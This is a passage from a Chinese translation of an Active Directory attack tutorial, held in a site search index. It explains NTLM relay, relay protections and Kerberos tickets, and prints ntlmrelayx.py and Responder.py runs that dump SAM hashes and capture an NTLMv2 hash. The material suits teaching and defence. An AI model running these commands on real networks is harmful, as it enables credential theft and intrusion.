<p>\u6b63\u5982\u6211\u4eec\u524d\u9762\u6240\u770b\u5230\u7684\uff0c\u7531\u4e8eSMB2\u603b\u662f\u8bbe\u7f6eNTLMSSP_NEGOTIATE_SIGN\uff0c\u56e0\u6b64\uff0c\u5982\u679c\u6211\u4eec\u628a\u8fd9\u4e2aNTLM\u6d88\u606f\u8f6c\u53d1\u5230\u652f\u6301\u7b7e\u540d\u7684LDAP\u670d\u52a1\u5668\uff0c\u90a3\u4e48\uff0c\u7b7e\u540d\u5c31\u4f1a\u88ab\u534f\u5546\uff0c\u653b\u51fb\u5c31\u4f1a\u5931\u8d25\u3002\u8bb0\u4f4f\uff0cNTLM\u6d88\u606f\u662f\u65e0\u6cd5\u7be1\u6539\u7684\uff0c\u56e0\u4e3a\u6709MIC\u5728\u4fdd\u62a4\u5b83\uff08\u5bf9\u4e8eNTLMv2\u800c\u8a00\uff09\u3002</p> <p>\u5728\u76f8\u53cd\u7684\u60c5\u51b5\u4e0b\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4e0e\u8fd9\u6837\u7684SMB2\u670d\u52a1\u5668\u8fdb\u884c\u534f\u5546\uff0c\u8fd9\u4e9b\u670d\u52a1\u5668\u7b26\u5408\u4e0b\u5217\u8981\u6c42\uff1a\u4e0d\u7528SMB\u5934\u90e8\u8fdb\u884c\u7b7e\u540d\uff0c\u5e76\u4e14\u4f1a\u8f6c\u53d1LDAP NTLM\u6d88\u606f\uff0c\u56e0\u4e3a\u5176\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4f1a\u8bbe\u7f6eNTLMSSP_NEGOTIATE_SIGN\u6807\u5fd7\u3002\u4e00\u65e6NTLM\u534f\u5546\u5b8c\u6210\uff0c\u7531\u4e8eSMB\u4e2d\u4e0d\u9700\u8981\u7b7e\u540d\uff0c\u4f1a\u8bdd\u5c31\u4e0d\u9700\u8981\u7b7e\u540d\uff0c\u6240\u4ee5\u653b\u51fb\u5c31\u80fd\u6210\u529f\u3002\u7136\u800c\uff0c\u8fd9\u79cd\u653b\u51fb\u65e0\u6cd5\u9488\u5bf9DC\uff0c\u56e0\u4e3a\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u5b83\u4eec\u9700\u8981\u7b7e\u540d\u3002</p> <pre><code>`client &lt;-----LDAP----&gt; attacker &lt;------SMB2------&gt; server (Non DC)       |                       |       |     LDAP request      |                          |       | --------------------&gt; |                          |       |                       |                          |       |     LDAP response     |                          |       | &lt;-------------------- |                          |       |                       |                          |       |                       |  SMB2 NEGOTIATE REQUEST  |       |                       | -----------------------&gt; |       |                       |  SMB SIGN_REQUIRED = 0   |         |                       |                          |       |                       |                          |       |                       |  SMB2 NEGOTIATE RESPONSE |       |                       | &lt;----------------------- |       |                       |  SMB SIGN_REQUIRED = 0   |         |                       |                          |       |                       |                     -----|--.       |   NEGOTIATE SIGN=1    |     NEGOTIATE SIGN=1     |  |       | --------------------&gt; | -----------------------&gt; |  |       |                       |                          |  |       |                       |                          |  |       |   CHALLENGE SIGN=1    |     CHALLENGE SIGN=1     |  |&gt; NTLM Relay       | &lt;-------------------- | &lt;----------------------- |  |       |                       |                          |  |       |                       |                          |  |        |  AUTHENTICATE SIGN=1  |   AUTHENTICATE SIGN=1    |  |       | --------------------&gt; | -----------------------&gt; | -|---&gt; MIC OK!!       |                       |                     -----|--'       |                       |         ||               |       |                       |         vv               |       |                       | client SIGN_REQUIRED = 0 |       |                       | server SIGN_REQUIRED = 0 |       |                       |         ||               |       |                       |         vv               |       |                       |  Signing NOT required    |       |                       |   Successful Attack!!    |       |                       |                          |       |                       |    application           |       |                       |     messages             |       |                       | -----------------------&gt; |       |                       |                          |       |                       | &lt;----------------------- |       |                       |                          |       |                       | -----------------------&gt; |       |                       |                          |`\n</code></pre> <p>\u4eceSMB2\u5230LDAP\u7684\u8de8\u534f\u8baeNTLM\u4e2d\u7ee7\uff08\u9ed8\u8ba4\u60c5\u51b5\uff09</p> <p>\u5b9e\u9645\u4e0a\uff0cSMB2\u534f\u8bae\u8fd8\u53ef\u4ee5\u9488\u5bf9\u81ea\u8eab\u8fdb\u884c\u4e2d\u7ee7\uff1a</p> <p><code>client &lt;------SMB2-----&gt; attacker &lt;------SMB2------&gt; server (Non DC)    |                          |                          |    | SMB2 NEGOTIATE REQUEST   |  SMB2 NEGOTIATE REQUEST  |    | -----------------------&gt; | -----------------------&gt; |    |  SMB SIGN_REQUIRED = 0   |  SMB SIGN_REQUIRED = 0   |    |                          |                          |    |                          |                          |    | SMB2 NEGOTIATE RESPONSE  |  SMB2 NEGOTIATE RESPONSE |    | &lt;----------------------- | &lt;----------------------- |    |  SMB SIGN_REQUIRED = 0   |  SMB SIGN_REQUIRED = 0   |    |                          |                          |    |                          |                          |    |                          |                     -----|--.    |   NEGOTIATE SIGN=1       |     NEGOTIATE SIGN=1     |  |    | --------------------&gt;    | -----------------------&gt; |  |    |                          |                          |  |    |                          |                          |  |    |   CHALLENGE SIGN=1       |     CHALLENGE SIGN=1     |  |&gt; NTLM Relay    | &lt;--------------------    | &lt;----------------------- |  |    |                          |                          |  |    |                          |                          |  |     |  AUTHENTICATE SIGN=1     |   AUTHENTICATE SIGN=1    |  |    | --------------------&gt;    | -----------------------&gt; | -|---&gt; MIC OK!!    |                          |                     -----|--'    |                          |           ||             |    |                          |           vv             |    |                          | client SIGN_REQUIRED = 0 |    |                          | server SIGN_REQUIRED = 0 |    |                          |           ||             |    |                          |           vv             |    |                          |  Signing NOT required    |    |                          |   Successful Attack!!    |    |                          |                          |    |                          |       application        |    |                          |        messages          |    |                          | -----------------------&gt; |    |                          |                          |    |                          | &lt;----------------------- |    |                          |                          |    |                          | -----------------------&gt; |    |                          |                          |</code></p> <p>SMB2 NTLM\u4e2d\u7ee7\uff08\u9ed8\u8ba4\u60c5\u51b5\uff09</p> <p><code>$ ntlmrelayx.py -t 192.168.100.10 -smb2support --no-http-server Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation  [*] Protocol Client HTTP loaded.. [*] Protocol Client HTTPS loaded.. [*] Protocol Client SMB loaded.. [*] Protocol Client LDAP loaded.. [*] Protocol Client LDAPS loaded.. [*] Protocol Client SMTP loaded.. [*] Protocol Client IMAP loaded.. [*] Protocol Client IMAPS loaded.. [*] Protocol Client MSSQL loaded.. /usr/lib/python3/dist-packages/requests/__init__.py:91: RequestsDependencyWarning: urllib3 (1.26.3) or chardet (3.0.4) doesn't match a supported version!   RequestsDependencyWarning) [*] Running in relay mode to single host [*] Setting up SMB Server  [*] Servers started, waiting for connections [*] SMBD-Thread-2: Connection from CONTOSO/ANAKIN@192.168.100.7 controlled, attacking target smb://192.168.100.10 [*] Authenticating against smb://192.168.100.10 as CONTOSO/ANAKIN SUCCEED [*] Service RemoteRegistry is in stopped state [*] Starting service RemoteRegistry [*] Target system bootKey: 0xb471eae0e93128b9c8d5780c19ac9f1d [*] Dumping local SAM hashes (uid:rid:lmhash:nthash) Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:6535b87abdb112a8fc3bf92528ac01f6::: user:1001:aad3b435b51404eeaad3b435b51404ee:57d583aa46d571502aad4bb7aea09c70::: srvuser:1005:aad3b435b51404eeaad3b435b51404ee:38db3f2d2842051c8b7c01d56da283dd::: [*] Done dumping SAM hashes for host: 192.168.100.10 [*] Stopping service RemoteRegistry</code></p> <p>\u901a\u8fc7ntlmrelayx.py\u5b9e\u73b0\u4eceSMB2\u5230SMB2\u7684NTLM\u4e2d\u7ee7</p> <p>\u53e6\u4e00\u4e2a\u53ef\u4ee5\u4f7f\u7528NTLM\u7684\u534f\u8bae\u662fHTTP\u534f\u8bae\uff0c\u5e76\u4e14\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u5b83\u4e0d\u4f1a\u4f7f\u7528\u7b7e\u540d\u3002\u56e0\u6b64\uff0cHTTP\u534f\u8bae\u53ef\u7528\u4e8eLDAP\u6216SMB\u7684\u8de8\u534f\u8bae\u4e2d\u7ee7\u653b\u51fb\u3002</p> <pre><code>`client &lt;-----HTTP----&gt; attacker &lt;----LDAP----&gt; server       |                       |                      |       |                       |                 -----|--.       |     NEGOTIATE SIGN=0  |  NEGOTIATE SIGN=0    |  |       | --------------------&gt; | -------------------&gt; |  |       |                       |                      |  |       |     CHALLENGE SIGN=1  |  CHALLENGE SIGN=1    |  |&gt; NTLM Relay       | &lt;-------------------- | &lt;------------------- |  |       |                       |                      |  |        |  AUTHENTICATE SIGN=0  | AUTHENTICATE SIGN=0  |  |       | --------------------&gt; | -------------------&gt; | -|---&gt; MIC OK!!        |                       |                 -----|--'       |                       |         ||           |       |                       |         vv           |       |                       |    client SIGN = 0   |       |                       |    server SIGN = 1   |       |                       |         ||           |       |                       |         vv           |       |                       | Signing NOT required |       |                       |  Successful Attack!! |       |                       |                      |       |                       |    application       |       |                       |     messages         |       |                       | -------------------&gt; |       |                       |                      |       |                       | &lt;------------------- |       |                       |                      |       |                       | -------------------&gt; |       |                       |                      |`\n</code></pre> <p>\u4eceHTTP\u5230LDAP\u7684\u8de8\u534f\u8baeNTLM\u4e2d\u7ee7</p> <p>\u6b63\u5982\u60a8\u6240\u770b\u5230\u7684\uff0c\u7531\u4e8e\u5ba2\u6237\u7aef\u6ca1\u6709\u6307\u5b9a\u542f\u7528\u7b7e\u540d\uff0c\u56e0\u6b64\u4e0d\u9700\u8981LDAP\u7b7e\u540d\u3002\u8fd9\u53ef\u4ee5\u7528\u6765\u5229\u7528PrivExchange\u6f0f\u6d1e\u3002\u5b9e\u9645\u4e0a\uff0c\u4e2d\u7ee7\u5230LDAP\u662f\u975e\u5e38\u6709\u7528\u7684\uff0c\u56e0\u4e3a\u60a8\u53ef\u4ee5\u7528\u6765\u66f4\u6539\u57df\u6570\u636e\u5e93\u7684ACL\u6216\u5bf9\u8c61\uff0c\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\u751a\u81f3\u53ef\u4ee5\u7528\u6765\u63d0\u5347\u6743\u9650\u3002</p> <p>\u4e3a\u4e86\u6267\u884cNTLM\u4e2d\u7ee7\u653b\u51fb\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528ntlmrelayx.py\u6216multirelay.py\u811a\u672c\uff0c\u8fd9\u4e9b\u811a\u672c\u53ef\u4ee5\u4e0eresponder.py\u7ed3\u5408\u8d77\u6765\uff0c\u4ece\u800c\u53d1\u52a8\u4e2d\u95f4\u4eba\u653b\u51fb\u3002\u5728Windows\u7cfb\u7edf\u4e2d\uff0c\u5176\u4ed6\u65b9\u6cd5\u662f\u4f7f\u7528Inveigh\u6765\u53d1\u52a8MiTM\u548c\u4e2d\u7ee7\u653b\u51fb\u3002\u8fd9\u4e2a\u5de5\u5177\u7684\u5c40\u9650\u6027\u662f\u4e0d\u5141\u8bb8\u4eceWindows\u8ba1\u7b97\u673a\u6267\u884c\u4eceSMB2\u5230SMB2\u7684NTLM\u4e2d\u7ee7\u653b\u51fb\uff0c\u56e0\u4e3a\u8be5\u7cfb\u7edf\u4f7f\u7528\u7684\u662f\u7aef\u53e3445\u3002</p> <p>\u9664\u4e86SMB\u548cLDAP\u4e4b\u5916\uff0c\u8fd8\u6709\u5176\u4ed6\u534f\u8bae\uff0c\u5982MS-SQL\u6216SMTP\uff0c\u4e5f\u652f\u6301NTLM\uff0c\u6240\u4ee5\uff0c\u5b83\u4eec\u4e5f\u53ef\u7528\u4e8e\u53d1\u52a8\u8fd9\u79cd\u653b\u51fb\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#ntlm-relay-protections","title":"NTLM Relay Protections","text":"<p>\u7136\u800c\uff0c\u5bf9\u4e8e\u8de8\u534f\u8bae\u7684NTLM\u4e2d\u7ee7\uff0c\u4e5f\u5b58\u5728\u5bf9\u5e94\u7684\u4fdd\u62a4\u63aa\u65bd\uff0c\u5373Channel Binding\u6216EPA\uff08Enhanced Protection for Authentication\uff09\u3002Channel Binding\u6280\u672f\u7684\u539f\u7406\u662f\u5728NTLM\u7684AUTHENTICATE\u6d88\u606f\u4e2d\u6dfb\u52a0\u5e94\u7528\u534f\u8bae\u7684\u4fe1\u606f\uff0c\u5e76\u901a\u8fc7MIC\u4fdd\u62a4\u8be5\u4fe1\u606f\u3002\u4e3a\u6b64\uff0c\u7cfb\u7edf\u5f15\u5165\u4e86\u4e24\u79cd\u7c7b\u578b\u7684\u7ed1\u5b9a\uff1a\u670d\u52a1\u7ed1\u5b9a\u548cTLS\u7ed1\u5b9a\u3002</p> <p>\u670d\u52a1\u7ed1\u5b9a\u6280\u672f\u4f1a\u8981\u6c42\u5ba2\u6237\u7aef\u5728AUTHENTICATE\u6d88\u606f\u7684AvPairs\u4e2d\u6307\u5b9a\u670d\u52a1SPN\uff08\u7531NTLMv2\u54c8\u5e0c\u503c\u63d0\u4f9b\u4fdd\u62a4\uff09\uff0c\u56e0\u6b64\uff0c\u670d\u52a1\u5668\u53ef\u4ee5\u68c0\u67e5NTLM\u8bf7\u6c42\u662f\u5426\u662f\u53d1\u7ed9\u5b83\u7684\u3002\u4f8b\u5982\uff0c\u5982\u679c\u5ba2\u6237\u7aef\u6307\u51fa\u67d0NTLM\u8bf7\u6c42\u662f\u53d1\u7ed9LDAP\u670d\u52a1\u7684\uff0c\u800c\u6536\u5230\u8be5\u8bf7\u6c42\u7684\u670d\u52a1\u5668\u662f\u5904\u7406SMB\uff08\u56e0\u4e3a\u4e2d\u95f4\u5b58\u5728\u653b\u51fb\u8005\uff09\u7684\uff0c\u5b83\u5c06\u62d2\u7edd\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002\u6b64\u5916\uff0cSPN\u4e5f\u4f1a\u6307\u5b9a\u670d\u52a1\u5668\u7684\u5730\u5740\uff0c\u6240\u4ee5\uff0c\u5982\u679c\u5b83\u88ab\u8f6c\u53d1\u5230\u975e\u76ee\u6807\u670d\u52a1\u5668\uff0c\u8eab\u4efd\u9a8c\u8bc1\u5c06\u88ab\u62d2\u7edd\u3002</p> <p>\u53e6\u4e00\u65b9\u9762\uff0c\u5728TLS\u7ed1\u5b9a\u4e2d\uff0c\u5ba2\u6237\u7aef\u4f1a\u7528\u670d\u52a1\u5668\u51ed\u636e\u7684\u4f1a\u8bdd\u5bc6\u94a5\u8ba1\u7b97\u4e00\u4e2a\u54c8\u5e0c\u503c\uff0c\u79f0\u4e3aCBT\uff08\u901a\u9053\u7ed1\u5b9a\u4ee4\u724c\uff09\uff0c\u4ee5\u7528\u6765\u521b\u5efaTLS\u901a\u9053\u3002\u5982\u679c\u6709\u653b\u51fb\u8005\u8fdb\u884cMiTM\u653b\u51fb\uff0c\u90a3\u4e48\u653b\u51fb\u8005\u63d0\u4f9b\u7684\u51ed\u636e\uff08\u5b83\u9700\u8981\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u51ed\u636e\u6765\u89e3\u5bc6/\u52a0\u5bc6TLS\u6d41\u91cf\uff09\u5c06\u4e0e\u539f\u59cb\u670d\u52a1\u5668\u7684\u51ed\u636e\u4e0d\u540c\u3002\u56e0\u6b64\uff0c\u670d\u52a1\u5668\u5c06\u68c0\u67e5\u7531\u5ba2\u6237\u7aef\u751f\u6210\u7684CBT\uff0c\u5982\u679c\u5b83\u4e0e\u81ea\u5df1\u7684\u51ed\u636e\u7684\u54c8\u5e0c\u503c\u4e0d\u5339\u914d\uff0c\u5b83\u5c06\u62d2\u7edd\u8be5\u8eab\u4efd\u9a8c\u8bc1\u3002</p> <p>\u4e0e\u7b7e\u540d\u4e00\u6837\uff0c\u901a\u9053\u7ed1\u5b9a\u7684\u5e94\u7528\u53d6\u51b3\u4e8e\u5e94\u7528\u534f\u8bae\u3002SMB\u548cLDAP\u7684\u66f4\u65b0\u5ba2\u6237\u7aef\u5e94\u8be5\u4f7f\u7528\u901a\u9053\u7ed1\u5b9a\uff0c\u4f46\u662f\u670d\u52a1\u5668\u4f3c\u4e4e\u5e76\u6ca1\u6709\u68c0\u67e5\u5b83\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#ntlm-hashes-cracking","title":"NTLM hashes cracking","text":"<p>\u5c3d\u7ba1\u5982\u6b64\uff0c\u5373\u4f7f\u5728\u65e0\u6cd5\u8fdb\u884c\u4e2d\u7ee7\u653b\u51fb\u7684\u60c5\u51b5\u4e0b\uff0c\u4e5f\u6709\u53ef\u80fd\u901a\u8fc7\u6267\u884c\u4e2d\u95f4\u4eba\u653b\u51fb\u6765\u83b7\u53d6NTLM\u54c8\u5e0c\u503c\uff0c\u7136\u540e\u8fdb\u884c\u7834\u89e3\u3002\u4e3a\u6b64\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528Responder.py\u6216Inveigh\u7b49\u5de5\u5177\u6765\u6267\u884cPiTM\u653b\u51fb\u3002</p> <p><code># ./Responder.py -I enp7s0                                          __   .----.-----.-----.-----.-----.-----.--|  |.-----.----.   |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|   |__| |_____|_____|   __|_____|__|__|_____||_____|__|                    |__|             NBT-NS, LLMNR &amp; MDNS Responder 3.0.2.0    Author: Laurent Gaffie (laurent.gaffie@gmail.com)   To kill this script hit CTRL-C  [+] Poisoners:     LLMNR                      [ON]     NBT-NS                     [ON]     DNS/MDNS                   [ON]  [+] Servers:     HTTP server                [ON]     HTTPS server               [ON]     WPAD proxy                 [OFF]     Auth proxy                 [OFF]     SMB server                 [ON]     Kerberos server            [ON]     SQL server                 [OFF]     FTP server                 [ON]     IMAP server                [ON]     POP3 server                [ON]     SMTP server                [ON]     DNS server                 [ON]     LDAP server                [OFF]     RDP server                 [ON]  [+] HTTP Options:     Always serving EXE         [OFF]     Serving EXE                [OFF]     Serving HTML               [OFF]     Upstream Proxy             [OFF]  [+] Poisoning Options:     Analyze Mode               [OFF]     Force WPAD auth            [OFF]     Force Basic Auth           [OFF]     Force LM downgrade         [OFF]     Fingerprint hosts          [OFF]  [+] Generic Options:     Responder NIC              [enp7s0]     Responder IP               [192.168.100.137]     Challenge set              [random]     Don't Respond To Names     ['ISATAP']  [!] Error starting TCP server on port 80, check permissions or other servers running. [+] Listening for events... [*] [LLMNR]  Poisoned answer sent to 192.168.100.7 for name fake-pc [*] [LLMNR]  Poisoned answer sent to 192.168.100.7 for name fake-pc [SMB] NTLMv2-SSP Client   : 192.168.100.7 [SMB] NTLMv2-SSP Username : CONTOSO\\anakin [SMB] NTLMv2-SSP Hash     : anakin::CONTOSO:9ec132434bd81f13:77E13480A5BE1935B832EE3E698C2424:0101000000000000C0653150DE09D2017C322564C9ADBF6D000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000100000000200000EE905EC8AAB434C41EE46C38DB764C06DF037FE97986A0CE2A7B6D7043FA4C900A001000000000000000000000000000000000000900180063006900660073002F00660061006B0065002D00700063000000000000000000</code></p> <p>\u4f7f\u7528Responder.py\u6355\u83b7NTLM\u54c8\u5e0c\u503c</p> <p>\u53e6\u4e00\u79cd\u5df2\u77e5\u7684\u68c0\u7d22NTLM\u54c8\u5e0c\u503c\u7684\u53ef\u80fd\u65b9\u6cd5\u662f\u521b\u5efa\u6076\u610f\u6587\u4ef6\uff0c\u5f53\u8fd9\u4e9b\u6587\u4ef6\u6253\u5f00\u65f6\u4e0e\u670d\u52a1\u5668\u5efa\u7acb\u8fde\u63a5\u3002\u60a8\u53ef\u4ee5\u4f7f\u7528NTLM_SUNTY\u6765\u521b\u5efa\u6536\u96c6NTLM\u54c8\u5e0c\u503c\u7684\u6587\u4ef6\u3002</p> <p>\u6b64\u5916\uff0c\u60a8\u8fd8\u53ef\u4ee5\u5229\u7528XXE\u6216LFI\u7b49Web\u670d\u52a1\u4e2d\u7684\u6f0f\u6d1e\uff0c\u901a\u8fc7\u5f3a\u5236\u8fde\u63a5\u5230\u60a8\u63a7\u5236\u7684\u8ba1\u7b97\u673a\u6765\u83b7\u53d6NTLM\u54c8\u5e0c\u503c\u3002\u6709\u65f6\uff0c\u6211\u4eec\u751a\u81f3\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u4e92\u8054\u7f51\u83b7\u53d6NTLM\u54c8\u5e0c\u503c\u3002</p> <p>\u6700\u540e\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528Hashcat\u6765\u7834\u89e3NTLM\u54c8\u5e0c\u503c\u3002NTLM\u54c8\u5e0c\u503c\uff08\u6216Net-NTLM\u54c8\u5e0c\u503c\uff09\u662f\u901a\u8fc7\u5ba2\u6237\u7aef\u5e10\u6237\u7684NT\u54c8\u5e0c\u503c\uff08\u4ee5\u53caAUTHENTICATE\u6d88\u606f\u4e2d\u5305\u542b\u7684\u516c\u5171\u4fe1\u606f\uff09\u521b\u5efa\u7684\u3002NTLMv1\u54c8\u5e0c\u503c\u6bd4NTLMv2\u54c8\u5e0c\u503c\u66f4\u5bb9\u6613\u7834\u89e3\uff0c\u56e0\u4e3a\u5b83\u4eec\u662f\u7528\u8f83\u5f31\u7684\u7b97\u6cd5\u521b\u5efa\u7684\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#kerberos","title":"Kerberos","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#kerberos-basics","title":"Kerberos Basics","text":"<p>Kerberos\u662fActive Directory\u7f51\u7edc\u4e2d\u57df\u5e10\u6237\u7684\u9996\u9009\u8eab\u4efd\u9a8c\u8bc1\u534f\u8bae\uff08\u4f46\u662f\u4e0d\u80fd\u5728\u5de5\u4f5c\u7ec4\u4e2d\u4f7f\u7528\uff09\u3002\u5b83\u662f\u7531Kerberos SSP\u5b9e\u73b0\u7684\u3002RFC4120\u6587\u6863\u8be6\u7ec6\u4ecb\u7ecd\u4e86Kerberos\u534f\u8bae\uff0c\u800cMS-KILE\u6587\u6863\u5219\u4ecb\u7ecd\u4e86\u8be5\u534f\u8bae\u7528\u4e8eActive Directory\u7684\u6269\u5c55\u7248\u672c\u3002</p> <p>Kerberos\u4e13\u6ce8\u4e8e\u4f7f\u7528\u79f0\u4e3a\u201c\u7968\u8bc1\u201d\u7684\u4ee4\u724c\uff0c\u5b83\u5141\u8bb8\u7528\u6237\u6839\u636e\u4e3b\u4f53\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#kerberos-principals","title":"Kerberos principals","text":"<p>\u6700\u5e38\u89c1\u7684Kerberos\u4e3b\u4f53\u662f\u7528\u6237\u548c\u670d\u52a1\u3002</p> <p>\u8981\u8bf7\u6c42\u670d\u52a1\u7684\u7968\u8bc1\uff0c\u60a8\u5fc5\u987b\u6307\u5b9a\u5176SPN\uff0c\u4f8b\u5982HTTP/Computer\u3002\u6b64\u5916\uff0c\u8fd8\u6709\u4e00\u4e9bKerberos\u4e3b\u4f53\u7c7b\u578b\u4e5f\u53ef\u7528\u4e8e\u8bf7\u6c42\u670d\u52a1\uff0c\u6bd4\u5982NT-SRV-INST\u3001NT-SRV-HST\u6216NT-SRV-XHST\u3002</p> <p>\u53e6\u4e00\u65b9\u9762\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u4f7f\u7528\u4e3b\u4f53\u6765\u8868\u793a\u7528\u6237\uff0c\u5b9e\u9645\u4e0a\u5b83\u4eec\u901a\u5e38\u7528\u4e8e\u6307\u793a\u8bf7\u6c42\u7968\u8bc1\u7684\u5ba2\u6237\u7aef\u7684\u540d\u79f0\u3002\u7528\u6237\u901a\u5e38\u662f\u7531SamAccountName\uff08\u4f8b\u5982\u201cfoo\u201d\uff09\u8868\u793a\u7684\uff0c\u4f7f\u7528\u7684\u7c7b\u578b\u4e3aNT-PRINCIPAL\u3002</p> <p>\u4f46\u662f\uff0c\u4e5f\u6709NT-ENTERPRISE\u7c7b\u578b\uff0c\u5b83\u5141\u8bb8\u4f7f\u7528\u66f4\u663e\u5f0f\u7684\u683c\u5f0f\u6765\u6807\u8bc6\u7528\u6237\uff1aSamAccountName@DomainFQDN\uff08\u4f8b\u5982\u201cfoo@contoso.local\u201d\uff09\u3002\u5f53\u60a8\u53d1\u51fa\u57df\u95f4\u8bf7\u6c42\u65f6\uff0cNT-ENTERPRISE\u53ef\u7528\u4e8e\u8bc6\u522b\u6765\u81ea\u4e0d\u540c\u57df\u7684\u7528\u6237\u3002</p> <p>\u6b64\u5916\uff0c\u8fd8\u53ef\u4ee5\u5c06\u7528\u6237\u4e3b\u4f53\u4f5c\u4e3a\u7968\u8bc1\u7684\u76ee\u6807\u3002\u653b\u51fb\u8005\u53ef\u5229\u7528\u8fd9\u4e00\u70b9\uff0c\u5728\u4e0d\u4e86\u89e3\u7528\u6237\u670d\u52a1\u7684\u60c5\u51b5\u4e0b\u6267\u884cKerberoast\u653b\u51fb\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#tickets","title":"Tickets","text":"<p>\u7968\u8bc1\u662f\u4e00\u79cd\u90e8\u5206\u52a0\u5bc6\u7684\u7ed3\u6784\u4f53\uff0c\u5176\u4e2d\u5305\u542b\uff1a</p> <ul> <li>\u7968\u8bc1\u6240\u5e94\u7528\u7684\u76ee\u6807\u4e3b\u4f53\uff08\u901a\u5e38\u662f\u670d\u52a1\uff09</li> <li>\u4e0e\u5ba2\u6237\u7aef\u76f8\u5173\u7684\u4fe1\u606f\uff0c\u5982\u540d\u79f0\u548c\u57df</li> <li>\u5728\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u4e4b\u95f4\u5efa\u7acb\u5b89\u5168\u901a\u9053\u7684\u5bc6\u94a5</li> <li>\u786e\u5b9a\u7968\u8bc1\u6709\u6548\u671f\u95f4\u7684\u65f6\u95f4\u6233</li> </ul> <p><code>Ticket          ::= [APPLICATION 1] SEQUENCE {         tkt-vno         [0] INTEGER (5),         realm           [1] Realm,         sname           [2] PrincipalName, -- Usually the service SPN         enc-part        [3] EncryptedData -- EncTicketPart }  EncTicketPart   ::= [APPLICATION 3] SEQUENCE {         flags                   [0] TicketFlags,         key                     [1] EncryptionKey, -- Session Key         crealm                  [2] Realm,         cname                   [3] PrincipalName,         transited               [4] TransitedEncoding,         authtime                [5] KerberosTime,         starttime               [6] KerberosTime OPTIONAL,         endtime                 [7] KerberosTime,         renew-till              [8] KerberosTime OPTIONAL,         caddr                   [9] HostAddresses OPTIONAL,         authorization-data      [10] AuthorizationData OPTIONAL -- Includes a PAC }</code></p> <p>\u7968\u8bc1\u7684\u5b9a[[HTB-Active#\u7aef\u53e3\u626b\u63cf]\u4e49</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#pac","title":"PAC","text":"<p>\u9664\u4e86\u5e38\u89c4\u7684\u7968\u8bc1\u6570\u636e\u4e4b\u5916\uff0cKerberos\u7684Active Directory\u5b9e\u73b0\u901a\u5e38\u8fd8\u5728\u6388\u6743\u6570\u636e\u7968\u8bc1\u5b57\u6bb5\u4e2d\u63d0\u4f9bActive Directory\u8eab\u4efd\u9a8c\u8bc1\u4e2d\u7684\u4e00\u4e2a\u91cd\u8981\u7ed3\u6784\uff1aPAC\u3002</p> <p>PAC\uff08Privilege Attribute Certificate\uff09\u63d0\u4f9b\u4e86\u4e0e\u5ba2\u6237\u7aef\u76f8\u5173\u7684\u5b89\u5168\u4fe1\u606f\uff1a</p> <ul> <li>\u5ba2\u6237\u7aef\u57df\uff1a\u5305\u62ec\u57df\u540d\u548cSID\uff08\u5206\u522b\u4e3aLogonDomainName\u548cLogonDomainId\uff09\u3002</li> <li>\u5ba2\u6237\u7aef\u7528\u6237\uff1a\u7528\u6237\u540d\u548c\u7528\u6237RID\uff08\u5206\u522b\u4e3aEffectiveName\u548cUserId\uff09\u3002</li> <li>\u5ba2\u6237\u7aef\u7ec4\uff1a\u7528\u6237\u6240\u5c5e\u7684\u90a3\u4e9b\u57df\u7ec4\u7684RID\uff08GroupID\uff09\u3002</li> 